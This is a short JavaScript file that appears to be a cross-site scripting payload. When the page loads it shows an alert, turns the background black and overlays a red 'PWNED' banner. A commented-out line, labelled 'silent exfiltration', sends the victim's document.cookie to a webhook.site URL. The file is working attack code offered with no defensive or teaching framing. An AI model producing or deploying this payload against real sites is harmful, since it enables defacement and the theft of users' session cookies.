// Visual confirmation that script executed
// document.body.innerHTML += "<h1 style='color:red'>🔥 XSS Executed!</h1>";

// Silent exfiltration to your webhook.site
// fetch("https://webhook.site/1058df3b-47af-4f36-81ac-769b03d17414?cookie=" + encodeURIComponent(document.cookie));
window.addEventListener('DOMContentLoaded', function() {
    alert("🔥 XSS Executed!");
    document.body.style.backgroundColor = "black";
    
    const h1 = document.createElement("h1");
    h1.innerText = "PWNED";
    h1.style.color = "red";
    h1.style.position = "fixed";
    h1.style.top = "20px";
    h1.style.left = "20px";
    h1.style.zIndex = "9999";
    h1.style.fontSize = "48px";
    
    document.body.appendChild(h1);
});
